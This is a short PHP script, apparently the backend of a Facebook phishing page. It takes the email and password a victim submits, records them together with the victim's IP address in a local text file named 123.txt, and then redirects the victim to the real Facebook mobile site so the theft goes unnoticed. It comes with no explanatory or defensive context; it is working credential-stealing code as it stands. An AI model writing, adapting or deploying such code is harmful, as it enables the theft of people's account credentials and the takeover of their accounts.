<?php
    header ('Location: https://m.facebook.com ');
	extract($_REQUEST);
    $file=fopen("123.txt","a");
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
	$IP = $_SERVER['HTTP_CLIENT_IP'];
	}elseif 	(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
	$IP = $_SERVER["HTTP_X_FORWARDED_FOR"];
	}else{
	$IP = $_SERVER['REMOTE_ADDR'];
	}
    fwrite($file,"Email: ");
    fwrite($file, $email ."\n");
    fwrite($file,"Password: ");
    fwrite($file, $password ."\n");
    fwrite($file,"Ip: ");
    fwrite($file, $IP ."\n");
    fclose($file);
 ?>